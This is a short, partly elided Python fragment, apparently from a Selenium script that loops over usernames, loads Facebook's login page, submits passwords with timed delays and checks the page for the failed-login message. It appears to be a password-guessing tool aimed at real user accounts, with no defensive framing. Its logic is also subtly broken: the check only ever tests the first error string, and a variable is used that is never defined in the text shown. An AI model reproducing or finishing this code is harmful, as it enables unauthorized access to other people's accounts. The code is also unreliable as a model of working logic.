...
def login(user, password, delay):
	try:
		...
		assert (("Your username or password was incorrect." or "incorrectos.") not in driver.page_source)
		...
		print("\r Check your connection\r")
	...
	if str(type(usernames)) == "<type 'list'>":
		for username in usernames:
			if (userExists(username) == 1):
				continue
			driver.get("https://facebook.com/accounts/login/")
			sleep(delay * 7)
